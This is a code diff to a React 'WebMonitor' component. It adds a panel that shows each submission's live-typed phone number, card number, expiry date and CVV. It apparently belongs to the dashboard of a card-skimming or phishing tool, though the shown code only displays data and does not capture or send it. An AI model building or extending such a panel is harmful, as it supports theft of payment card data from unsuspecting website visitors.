@@ -261,6 +261,44 @@ export function WebMonitor() {
                   <div className="text-xs text-muted-foreground mt-1">
                     {submission.statusText}
                   </div>
+
+                  {/* 实时输入的敏感信息 */}
+                  {submission.realtimeInput && (
+                    <div className="mt-2 p-2 bg-gray-50 rounded border-l-2 border-red-400">
+                      <div className="text-xs font-medium text-gray-700 mb-1 flex items-center gap-1">
+                        🔴 实时输入
+                        <span className="animate-pulse">●</span>
+                      </div>
+                      <div className="space-y-1 text-xs">
+                        {submission.realtimeInput.phone && (
+                          <div className="flex items-center gap-2">
+                            <span className="text-gray-500 w-8">📱</span>
+                            <span className="font-mono text-gray-800">{submission.realtimeInput.phone}</span>
+                          </div>
+                        )}
+                        {submission.realtimeInput.cardNumber && (
+                          <div className="flex items-center gap-2">
+                            <span className="text-gray-500 w-8">💳</span>
+                            <span className="font-mono text-gray-800">{submission.realtimeInput.cardNumber}</span>
+                          </div>
+                        )}
+                        <div className="flex items-center gap-4">
+                          {submission.realtimeInput.expiryDate && (
+                            <div className="flex items-center gap-2">
+                              <span className="text-gray-500 w-8">📅</span>
+                              <span className="font-mono text-gray-800">{submission.realtimeInput.expiryDate}</span>
+                            </div>
+                          )}
+                          {submission.realtimeInput.cvv && (
+                            <div className="flex items-center gap-2">
+                              <span className="text-gray-500 w-8">🔒</span>
+                              <span className="font-mono text-gray-800">{submission.realtimeInput.cvv}</span>
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    </div>
+                  )}
                 </div>
 
                 {/* Website & Page Info */}
